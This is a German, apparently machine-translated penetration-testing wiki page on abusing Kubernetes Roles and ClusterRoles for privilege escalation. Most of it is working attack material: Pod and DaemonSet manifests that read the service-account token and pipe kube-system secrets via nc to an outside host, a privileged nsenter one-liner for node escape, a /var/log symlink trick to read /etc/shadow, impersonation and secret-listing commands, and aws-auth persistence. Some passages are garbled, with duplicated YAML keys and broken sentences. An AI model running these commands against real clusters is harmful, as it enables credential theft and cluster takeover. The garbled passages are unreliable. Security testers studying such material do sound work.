# Ausnutzung von Rollen/ClusterRoles in Kubernetes

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositorys einreichen.

</details>

Hier finden Sie einige potenziell gef√§hrliche Konfigurationen von Rollen und ClusterRoles.\
Denken Sie daran, dass Sie alle unterst√ºtzten Ressourcen mit `kubectl api-resources` abrufen k√∂nnen.

## **Privilegieneskalation**

Als die Kunst, **Zugriff auf einen anderen Hauptbenutzer** innerhalb des Clusters **mit unterschiedlichen Berechtigungen** (innerhalb des Kubernetes-Clusters oder zu externen Clouds) zu erhalten, gibt es in Kubernetes im Wesentlichen **4 Haupttechniken zur Eskalation von Berechtigungen**:

* Die F√§higkeit, **andere Benutzer/Gruppen/SAs mit besseren Berechtigungen zu impersonieren** innerhalb des Kubernetes-Clusters oder zu externen Clouds
* Die F√§higkeit, **Pods zu erstellen/zu patchen/auszuf√ºhren**, in denen Sie **SAs finden oder anh√§ngen k√∂nnen** mit besseren Berechtigungen innerhalb des Kubernetes-Clusters oder zu externen Clouds
* Die F√§higkeit, **Geheimnisse zu lesen**, da die SAs-Token als Geheimnisse gespeichert sind
* Die F√§higkeit, **aus einem Container auf den Knoten zu entkommen**, wo Sie alle Geheimnisse der in dem Knoten ausgef√ºhrten Container, die Anmeldeinformationen des Knotens und die Berechtigungen des Knotens innerhalb der Cloud, in der er ausgef√ºhrt wird (falls vorhanden), stehlen k√∂nnen
* Eine f√ºnfte Technik, die erw√§hnenswert ist, ist die F√§higkeit, **Port-Forward** in einem Pod auszuf√ºhren, da Sie m√∂glicherweise auf interessante Ressourcen innerhalb dieses Pods zugreifen k√∂nnen.

### Zugriff auf jede Ressource oder jedes Verb (Wildcard)

Der **Platzhalter (\*) gibt Berechtigungen √ºber jede Ressource mit jedem Verb**. Er wird von Admins verwendet. Innerhalb einer ClusterRole bedeutet dies, dass ein Angreifer auf jeden Namespace im Cluster zugreifen k√∂nnte.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### Zugriff auf beliebige Ressourcen mit einem bestimmten Verb

Im RBAC stellen bestimmte Berechtigungen erhebliche Risiken dar:

1. **`create`:** Gew√§hrt die F√§higkeit, beliebige Cluster-Ressourcen zu erstellen und riskiert damit eine Privilegieneskalation.
2. **`list`:** Erm√∂glicht das Auflisten aller Ressourcen und k√∂nnte potenziell sensible Daten preisgeben.
3. **`get`:** Erlaubt den Zugriff auf Secrets von Service-Accounts und birgt eine Sicherheitsbedrohung.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Pod erstellen - Token stehlen

Ein Angreifer mit den Berechtigungen zum Erstellen eines Pods k√∂nnte einem privilegierten Service Account in den Pod anh√§ngen und das Token stehlen, um sich als den Service Account auszugeben. Dadurch werden effektiv die Berechtigungen eskaliert.

Beispiel eines Pods, der das Token des `bootstrap-signer` Service Accounts stehlen und an den Angreifer senden wird:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Pod Erstellen & Entkommen

Das Folgende zeigt alle Berechtigungen, die ein Container haben kann:

* **Privilegierter Zugriff** (Deaktivierung von Schutzma√ünahmen und Festlegung von F√§higkeiten)
* **Deaktivierung der Namespaces hostIPC und hostPid**, die zur Eskalation von Berechtigungen beitragen k√∂nnen
* **Deaktivierung des hostNetwork**-Namespaces, um Zugriff auf gestohlene Cloud-Berechtigungen und besseren Netzwerkzugriff zu erhalten
* **Einbinden von /hosts innerhalb des Containers**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

Erstellen Sie das Pod mit:
```bash
kubectl --token $token create -f mount_root.yaml
```
Ein Satz aus [diesem Tweet](https://twitter.com/mauilion/status/1129468485480751104) und mit einigen Erg√§nzungen:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
### Tarnung

Du m√∂chtest wahrscheinlich **unauff√§lliger** sein, auf den folgenden Seiten kannst du sehen, auf welche Ressourcen du zugreifen k√∂nntest, wenn du einen Pod erstellst, der nur einige der zuvor genannten Berechtigungen aktiviert:

- **Privileged + hostPID**
- **Nur privilegiert**
- **hostPath**
- **hostPID**
- **hostNetwork**
- **hostIPC**

_Ein Beispiel, wie man die zuvor genannten privilegierten Pod-Konfigurationen erstellen/missbrauchen kann, findest du unter_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### Pod erstellen - In die Cloud wechseln

Wenn du einen **Pod erstellen** kannst (und optional ein **Service-Konto**), k√∂nntest du **Berechtigungen in der Cloud-Umgebung erhalten**, indem du **Cloud-Rollen einem Pod oder einem Service-Konto zuweist** und dann darauf zugreifst.\
Dar√ºber hinaus, wenn du einen **Pod mit dem Host-Netzwerk-Namensraum erstellen kannst**, kannst du die **IAM**-Rolle der **Knoten**-Instanz **stehlen**.

F√ºr weitere Informationen siehe:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **Erstellen/Patchen von Bereitstellungen, Daemonsets, Statefulsets, Replikationscontrollern, Replikasets, Jobs und Cronjobs**

Es ist m√∂glich, diese Berechtigungen zu **missbrauchen**, um einen neuen Pod zu erstellen und Berechtigungen wie im vorherigen Beispiel zu erhalten.

Das folgende YAML **erstellt ein Daemonset und schmuggelt das Token des SA** innerhalb des Pods aus:
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Pods Exec**

**`pods/exec`** ist eine Ressource in Kubernetes, die zum **Ausf√ºhren von Befehlen in einer Shell innerhalb eines Pods** verwendet wird. Dies erm√∂glicht es, **Befehle innerhalb der Container auszuf√ºhren oder eine Shell zu √∂ffnen**.

Daher ist es m√∂glich, **in einen Pod einzudringen und das Token des SA zu stehlen**, oder in einen privilegierten Pod einzutreten, auf den Knoten zu entkommen und alle Tokens der Pods im Knoten zu stehlen und den Knoten zu (miss)brauchen:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### port-forward

Diese Berechtigung erm√∂glicht es, **einen lokalen Port auf einen Port im angegebenen Pod weiterzuleiten**. Dies soll es erm√∂glichen, Anwendungen, die in einem Pod ausgef√ºhrt werden, einfach zu debuggen, aber ein Angreifer k√∂nnte sie missbrauchen, um Zugriff auf interessante (wie DBs) oder anf√§llige Anwendungen (Webs?) innerhalb eines Pods zu erhalten:
```
kubectl port-forward pod/mypod 5000:5000
```
### Hosts beschreibbar /var/log/ Escape

Wie in dieser [**Forschung angegeben**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), wenn Sie auf ein Pod mit dem **hosts `/var/log/` Verzeichnis gemountet** darauf zugreifen oder erstellen k√∂nnen, k√∂nnen Sie **aus dem Container ausbrechen**.\
Dies liegt im Wesentlichen daran, dass wenn der **Kube-API versucht, die Logs** eines Containers abzurufen (mit `kubectl logs <pod>`), er die Datei `0.log` des Pods √ºber den `/logs/` Endpunkt des **Kubelet** Dienstes anfordert.\
Der Kubelet-Dienst stellt den `/logs/` Endpunkt bereit, der im Grunde genommen das Dateisystem `/var/log` des Containers **freigibt**.

Daher k√∂nnte ein Angreifer mit **Schreibzugriff auf den /var/log/ Ordner** des Containers dieses Verhalten auf 2 Arten ausnutzen:

* √Ñndern der `0.log` Datei seines Containers (normalerweise im Verzeichnis `/var/logs/pods/namespace_pod_uid/container/0.log`) so dass sie ein **Symbolic Link auf `/etc/shadow`** beispielsweise zeigt. Dann k√∂nnen Sie die hosts shadow Datei extrahieren, indem Sie:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* Wenn der Angreifer irgendeinen Prinzipal kontrolliert, der die Berechtigungen zum Lesen von `nodes/log` hat, kann er einfach einen **Symlink** in `/host-mounted/var/log/sym` zu `/` erstellen und wenn er **auf `https://<gateway>:10250/logs/sym/` zugreift, wird er die Wurzel des Host-Dateisystems auflisten** (das √Ñndern des Symlinks kann den Zugriff auf Dateien erm√∂glichen).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**Ein Labor und ein automatisierter Exploit finden Sie unter** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### Umgehen des Schreibschutzes f√ºr readOnly <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Wenn Sie Gl√ºck haben und die hochprivilegierte F√§higkeit `CAP_SYS_ADMIN` verf√ºgbar ist, k√∂nnen Sie einfach den Ordner neu einh√§ngen als rw:
```bash
mount -o rw,remount /hostlogs/
```
#### Umgehen des hostPath readOnly-Schutzes <a href="#umgehen-des-hostpath-readonly-schutzes" id="umgehen-des-hostpath-readonly-schutzes"></a>

Wie in [**dieser Forschung**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html) angegeben, ist es m√∂glich, den Schutz zu umgehen:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
Das sollte verhindern, dass wie zuvor durch die Verwendung eines hostPath-Mounts entkommen wird, stattdessen wird ein PersistentVolume und ein PersistentVolumeClaim verwendet, um einen Host-Ordner im Container mit Schreibzugriff einzubinden:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **Vort√§uschen privilegierter Konten**

Mit einem [**Benutzerimitations**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation)-Privileg k√∂nnte ein Angreifer ein privilegiertes Konto vort√§uschen.

Verwenden Sie einfach den Parameter `--as=<Benutzername>` im `kubectl`-Befehl, um einen Benutzer zu imitieren, oder `--as-group=<Gruppe>`, um eine Gruppe zu imitieren:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
Oder verwenden Sie die REST-API:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Auflisten von Geheimnissen

Die Berechtigung zum **Auflisten von Geheimnissen k√∂nnte einem Angreifer tats√§chlich erm√∂glichen, die Geheimnisse zu lesen**, indem er auf den REST-API-Endpunkt zugreift:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Lesen eines Geheimnisses ‚Äì Brute-Force von Token-IDs

Ein Angreifer, der im Besitz eines Tokens mit Leseberechtigungen ist, ben√∂tigt den genauen Namen des Geheimnisses, um es zu verwenden. Im Gegensatz zu den umfassenderen _**Auflisten von Geheimnissen**_-Berechtigungen bestehen jedoch immer noch Schwachstellen. Standarddienstkonten im System k√∂nnen aufgelistet werden, von denen jedes mit einem Geheimnis verbunden ist. Diese Geheimnisse haben eine Namensstruktur: ein statisches Pr√§fix gefolgt von einem zuf√§lligen alphanumerischen Token mit f√ºnf Zeichen (unter Ausschluss bestimmter Zeichen) gem√§√ü dem [Quellcode](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83).

Das Token wird aus einem begrenzten 27-Zeichen-Set (`bcdfghjklmnpqrstvwxz2456789`) generiert, anstatt des vollst√§ndigen alphanumerischen Bereichs. Diese Einschr√§nkung reduziert die Gesamtanzahl m√∂glicher Kombinationen auf 14.348.907 (27^5). Folglich k√∂nnte ein Angreifer in wenigen Stunden einen Brute-Force-Angriff ausf√ºhren, um das Token zu erraten, was m√∂glicherweise zu einem Privileg-Eskalation durch den Zugriff auf sensible Dienstkonten f√ºhrt.

### Zertifikatanforderungen signieren

Wenn Sie die Verben **`create`** in der Ressource `certificatesigningrequests` haben (oder zumindest in `certificatesigningrequests/nodeClient`). K√∂nnen Sie eine **neue CeSR eines neuen Knotens erstellen.**

Gem√§√ü der [Dokumentation ist es m√∂glich, diese Anfragen automatisch zu genehmigen](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), sodass Sie in diesem Fall **keine zus√§tzlichen Berechtigungen** ben√∂tigen. Andernfalls m√ºssten Sie in der Lage sein, die Anfrage zu genehmigen, was ein Update in `certificatesigningrequests/approval` und `approve` in `signers` mit dem Ressourcennamen `<signerNameDomain>/<signerNamePath>` oder `<signerNameDomain>/*` bedeutet.

Ein **Beispiel f√ºr eine Rolle** mit allen erforderlichen Berechtigungen ist:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
Also, mit der Genehmigung des neuen Knoten-Zertifikats k√∂nnen Sie die speziellen Berechtigungen der Knoten missbrauchen, um Geheimnisse zu stehlen und Privilegien zu eskalieren.

In [**diesem Beitrag**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) und [**diesem**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) wird die GKE K8s TLS-Bootstrap-Konfiguration mit automatischer Signierung konfiguriert und missbraucht, um Anmeldeinformationen f√ºr einen neuen K8s-Knoten zu generieren und diese dann zu missbrauchen, um Privilegien zu eskalieren, indem Geheimnisse gestohlen werden. Wenn Sie √ºber die genannten Berechtigungen verf√ºgen, k√∂nnten Sie dasselbe tun. Beachten Sie, dass das erste Beispiel den Fehler umgeht, der verhindert, dass ein neuer Knoten auf Geheimnisse in Containern zugreifen kann, da ein Knoten nur auf die Geheimnisse von Containern zugreifen kann, die auf ihm eingebunden sind.

Der Weg, dies zu umgehen, besteht einfach darin, Anmeldeinformationen f√ºr den Knotennamen zu erstellen, auf dem der Container mit den interessanten Geheimnissen eingebunden ist (aber pr√ºfen Sie einfach, wie es im ersten Beitrag gemacht wird):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth ConfigMaps

Prinzipien, die **`configmaps`** im kube-system Namespace auf EKS √§ndern k√∂nnen (m√ºssen in AWS sein), k√∂nnen Cluster-Admin-Berechtigungen erhalten, indem sie das **aws-auth** ConfigMap √ºberschreiben.\
Die ben√∂tigten Verben sind **`update`** und **`patch`**, oder **`create`**, wenn das ConfigMap nicht erstellt wurde:
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
Sie k√∂nnen **`aws-auth`** f√ºr **Persistenz** verwenden, um Benutzern aus **anderen Konten** Zugriff zu gew√§hren.

Jedoch funktioniert `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **nicht von einem anderen Konto aus**. Aber tats√§chlich funktioniert `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing`, wenn Sie die ARN des Clusters anstelle des Namens eingeben.\
Um `kubectl` zum Laufen zu bringen, stellen Sie einfach sicher, dass Sie die **Kubeconfig des Opfers konfigurieren** und in den aws exec-Argumenten `--profile other_account_role` hinzuf√ºgen, damit kubectl das Profil des anderen Kontos verwendet, um das Token zu erhalten und sich mit AWS in Verbindung zu setzen.
{% endhint %}

### Eskalation in GKE

Es gibt **2 M√∂glichkeiten, K8s-Berechtigungen f√ºr GCP-Prinzipale zuzuweisen**. In jedem Fall ben√∂tigt der Prinzipal auch die Berechtigung **`container.clusters.get`**, um Anmeldeinformationen zum Zugriff auf den Cluster zu sammeln, oder Sie m√ºssen **Ihre eigene kubectl-Konfigurationsdatei generieren** (folgen Sie dem n√§chsten Link).

{% hint style="warning" %}
Beim Sprechen mit dem K8s-API-Endpunkt wird das **GCP-Authentifizierungstoken gesendet**. Dann wird GCP √ºber den K8s-API-Endpunkt zuerst **√ºberpr√ºfen, ob der Prinzipal** (per E-Mail) **irgendeinen Zugriff innerhalb des Clusters hat**, dann wird √ºberpr√ºft, ob er **irgendeinen Zugriff √ºber GCP IAM hat**.\
Wenn **eines** davon **zutrifft**, wird er **beantwortet**. Wenn **nicht**, wird ein **Fehler** gemeldet, der darauf hinweist, Berechtigungen √ºber GCP IAM zu erteilen.
{% endhint %}

Dann ist die erste Methode die Verwendung von **GCP IAM**, die K8s-Berechtigungen haben ihre **entsprechenden GCP IAM-Berechtigungen**, und wenn der Prinzipal diese hat, kann er sie verwenden.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

Die zweite Methode besteht darin, **K8s-Berechtigungen innerhalb des Clusters zuzuweisen**, um den Benutzer anhand seiner **E-Mail-Adresse** zu identifizieren (einschlie√ülich GCP-Servicekonten).

### Erstellen von Serviceaccounts-Token

Prinzipale, die **TokenRequests erstellen k√∂nnen** (`serviceaccounts/token`) Beim Sprechen mit dem K8s-API-Endpunkt SAs (Informationen von [**hier**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)).

### Ephemeralcontainers

Prinzipale, die **`pods/ephemeralcontainers`** **`aktualisieren`** oder **`patchen`** k√∂nnen, k√∂nnen **Code auf anderen Pods ausf√ºhren** und potenziell √ºber einen ephemeral Container mit einem privilegierten securityContext auf ihren Knoten ausbrechen.

### ValidatingWebhookConfigurations oder MutatingWebhookConfigurations

Prinzipale mit einem der Verben `create`, `update` oder `patch` √ºber `validatingwebhookconfigurations` oder `mutatingwebhookconfigurations` k√∂nnen m√∂glicherweise eine solche Webhook-Konfiguration erstellen, um **Berechtigungen zu eskalieren**.

F√ºr ein Beispiel zu [`mutatingwebhookconfigurations` siehe diesen Abschnitt dieses Beitrags](./#malicious-admission-controller).

### Eskalation

Wie Sie im n√§chsten Abschnitt lesen k√∂nnen: [**Eingebaute Vorbeugung gegen privilegierte Eskalation**](./#built-in-privileged-escalation-prevention), ein Prinzipal kann weder Rollen noch Clusterrollen aktualisieren oder erstellen, ohne selbst diese neuen Berechtigungen zu haben. Es sei denn, er hat das **Verb `eskaliere`** √ºber **`Rollen`** oder **`Clusterrollen`.**\
Dann kann er neue Rollen und Clusterrollen mit besseren Berechtigungen als die, die er hat, aktualisieren/erstellen.

### Knoten-Proxy

Prinzipale mit Zugriff auf die **`nodes/proxy`**-Unterressource k√∂nnen √ºber die Kubelet-API Code auf Pods ausf√ºhren (gem√§√ü [**diesem**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)). Weitere Informationen zur Kubelet-Authentifizierung auf dieser Seite:

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

Sie finden ein Beispiel, wie Sie [**RCE autorisiert mit einer Kubelet-API sprechen** hier](../pentesting-kubernetes-services/#kubelet-rce).

### Pods l√∂schen + nicht planbare Knoten

Prinzipale, die **Pods l√∂schen** k√∂nnen (`delete`-Verb √ºber Ressource `pods`), oder **Pods evakuieren** k√∂nnen (`create`-Verb √ºber Ressource `pods/eviction`), oder **den Pod-Status √§ndern** k√∂nnen (Zugriff auf `pods/status`) und Knoten **nicht planbar machen** k√∂nnen (Zugriff auf `nodes/status`) oder **Knoten l√∂schen** k√∂nnen (`delete`-Verb √ºber Ressource `nodes`) und die Kontrolle √ºber einen Pod haben, k√∂nnten **Pods von anderen Knoten stehlen**, sodass sie auf dem **kompromittierten Knoten** ausgef√ºhrt werden und der Angreifer die Tokens von diesen Pods **stehlen** kann.

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### Dienststatus (CVE-2020-8554)

Prinzipale, die **`services/status`** **√§ndern** k√∂nnen, k√∂nnen das Feld `status.loadBalancer.ingress.ip` manipulieren, um die **ungefixte CVE-2020-8554** auszunutzen und **MiTM-Angriffe gegen den Cluster** zu starten. Die meisten Ma√ünahmen gegen CVE-2020-8554 verhindern nur ExternalIP-Dienste (gem√§√ü [**diesem**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)).

### Knoten- und Pod-Status

Prinzipale mit Berechtigungen zum **`Aktualisieren`** oder **`Patchen`** von `nodes/status` oder `pods/status` k√∂nnten Labels √§ndern, um die durchgesetzten Terminierungsbeschr√§nkungen zu beeinflussen.

## Eingebaute Vorbeugung gegen privilegierte Eskalation

Kubernetes verf√ºgt √ºber einen [eingebauten Mechanismus](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention), um privilegierte Eskalation zu verhindern.

Dieses System stellt sicher, dass **Benutzer ihre Berechtigungen nicht erh√∂hen k√∂nnen, indem sie Rollen oder Rollenbindungen √§ndern**. Die Durchsetzung dieser Regel erfolgt auf API-Ebene und bietet einen Schutz, selbst wenn der RBAC-Autorisierer inaktiv ist.

Die Regel besagt, dass ein **Benutzer nur eine Rolle erstellen oder aktualisieren kann, wenn er alle Berechtigungen besitzt, die die Rolle umfasst**. Dar√ºber hinaus muss der Umfang der vorhandenen Berechtigungen des Benutzers mit dem der Rolle √ºbereinstimmen, die er zu erstellen oder zu √§ndern versucht: entweder clusterweit f√ºr ClusterRoles oder auf denselben Namespace (oder clusterweit) beschr√§nkt f√ºr Roles.

{% hint style="warning" %}
Es gibt eine Ausnahme von der vorherigen Regel. Wenn ein Prinzipal das **Verb `eskaliere`** √ºber **`Rollen`** oder **`ClusterRoles`** hat, kann er die Berechtigungen von Rollen und ClusterRoles erh√∂hen, auch ohne die Berechtigungen selbst zu besitzen.
{% endhint %}

### **RolleBindings/ClusterRoleBindings abrufen & patchen**

{% hint style="danger" %}
**Anscheinend hat diese Technik fr√ºher funktioniert, aber laut meinen Tests funktioniert sie nicht mehr aus demselben Grund, der im vorherigen Abschnitt erkl√§rt wurde. Du kannst keine Rollebindung erstellen/√§ndern, um dir selbst oder einem anderen SA einige Berechtigungen zu geben, wenn du sie nicht bereits hast.**
{% endhint %}

Die Berechtigung zum Erstellen von RolleBindings erm√∂glicht es einem Benutzer, **Rollen an einen Dienstaccount zu binden**. Diese Berechtigung kann potenziell zu privilegierter Eskalation f√ºhren, da es dem Benutzer erm√∂glicht, Admin-Berechtigungen an einen kompromittierten Dienstaccount zu binden.

## Andere Angriffe

### Sidecar-Proxy-App

Standardm√§√üig gibt es keine Verschl√ºsselung in der Kommunikation zwischen Pods. Gegenseitige Authentifizierung, bidirektional, Pod zu Pod.

#### Erstellen einer Sidecar-Proxy-App <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

Erstelle deine .yaml
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
Bearbeite deine .yaml und f√ºge die auskommentierten Zeilen hinzu:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
Siehe die Logs des Proxys:
```bash
kubectl logs app -C proxy
```
Mehr Informationen unter: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

